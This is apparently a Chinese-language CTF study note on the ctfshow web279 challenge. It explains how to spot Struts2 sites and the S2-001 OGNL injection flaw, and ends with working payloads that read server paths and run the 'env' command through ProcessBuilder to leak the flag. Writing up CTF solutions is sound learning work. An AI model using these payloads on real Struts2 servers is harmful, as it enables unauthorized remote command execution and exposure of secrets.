---
title: ctfshow-java
date: 2024-11-15 19:47:20
tags:
categories: 学习笔记
---

看wp说好像ctfshow全是java的Struts2的框架漏洞

Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架

**判断网站是否基于Struts2的方法**

- 通过页面回显的错误消息来判断，页面不回显错误消息时则无效
- 通过网页后缀来判断，如.do .action，有可能不准
- 如果配置文件中常数extension的值以逗号结尾或者有空值，指明了action可以不带后缀，那么不带后缀的uri也可能是struts2框架搭建的
- 如果使用Struts2的rest插件，其默认的struts-plugin.xml指定的请求后缀为xhtml,xml和json
  判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true

## web279

给出提示echo flag

我们看到url也有提示 **S2-001**

![image-20241115195142711](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411151951801.png)

[s2-001](https://www.freebuf.com/column/224041.html)是一个struts2命令执行漏洞编号

漏洞原理

> struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据。

![1](https://i-blog.csdnimg.cn/blog_migrate/a3223a8c6a4c9cdfa2566cf54f5523e5.gif)

加法表达式`%{1+1}`成功执行

我们了解下OGNL表达式三个符号%,#,$的符号的含义

> - `%`的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值
> - `#`的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用
> - `$`主要是在Struts 2配置文件中，引用OGNL表达式

payload

```
// 获取tomcat路径
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}

// 获取web路径
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}

// 命令执行 env，flag就在其中
password=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}&username=1

```

